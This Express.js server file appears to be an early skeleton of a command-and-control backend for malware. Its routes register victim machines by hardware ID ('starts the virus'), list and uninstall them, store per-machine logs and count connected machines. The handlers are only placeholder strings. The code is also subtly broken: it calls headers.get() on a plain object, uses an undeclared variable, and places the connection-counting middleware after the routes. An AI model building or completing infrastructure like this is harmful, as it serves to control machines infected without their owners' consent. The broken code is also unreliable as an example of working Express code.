const express = require('express');
const app = express();
const port = 80;

let connectedCount = 0;

app.get('/keepalive', (req, res) => {
  res.sendStatus(200); // Send a 200 OK response
});

// Route 1
app.get('/Machines', (req, res) => {
    headers = req.headers;
    headers.get('Auth-key');
    res.send('display machines');
});

app.post("/machines/new", (req,res) => {
    headers = req.headers;
    headers.get('app-id');
    res.send("Adds hwid to database and starts the virus")
});

app.post("/machines/Remove", (req,res) => {
    res.send("uninstall from machine")
});

// Route 2
app.get('/logs', (req, res) => {
  res.send('These are our logs');
});

app.get("/Logs/new", (req, res) => {
    res.send("Adding log to hwid in db 1")
})

app.get("/Logs/Remove", (req, res) => {
    res.send("Removing log from hwid in db 1")
});

// Route 3
app.get('/route3', (req, res) => {
  res.send('This is Route 3');
});

app.use((req, res, next) => {
  connectedCount++;
  console.log(`New connection! Total connected machines: ${connectedCount}`);
  next();
});
app.use((req, res, next) => {
  setTimeout(function () {
    connectionclose();
  }, 10000);
  next();
});

function connectionclose(){
  connectedCount--;
  console.log(`Connection closed! Total connected machines: ${connectedCount}`);
}
app.get('/keep-alive', (req, res) => {
  res.sendStatus(200);
});

// Start the server
app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});